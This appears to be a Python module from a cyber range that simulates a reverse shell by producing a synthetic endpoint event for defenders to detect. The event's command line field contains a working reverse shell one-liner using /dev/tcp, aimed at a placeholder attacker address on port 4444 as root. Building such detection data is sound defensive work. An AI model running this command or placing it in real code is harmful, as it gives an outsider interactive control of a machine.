"""
Cyber Range Attack Module: Reverse Shell Payload Simulator
Simulates post-exploitation interactive reverse shell spawning.
"""
from typing import Dict, Any


class ReverseShellSimulator:
    def __init__(self, target_host: str = "192.168.1.50", attacker_c2: str = "198.51.100.44", port: int = 4444):
        self.target_host = target_host
        self.attacker_c2 = attacker_c2
        self.port = port

    def generate_endpoint_event(self) -> Dict[str, Any]:
        return {
            "@timestamp": None,
            "event": {"category": "endpoint", "action": "EXEC", "dataset": "sentinel.ebpf"},
            "process": {
                "name": "sh",
                "pid": 9482,
                "parent": {"pid": 1204},
                "command_line": f"/bin/sh -i >& /dev/tcp/{self.attacker_c2}/{self.port} 0>&1",
            },
            "destination": {
                "ip": self.attacker_c2,
                "port": self.port,
            },
            "user": {"id": "0", "name": "root"},
        }
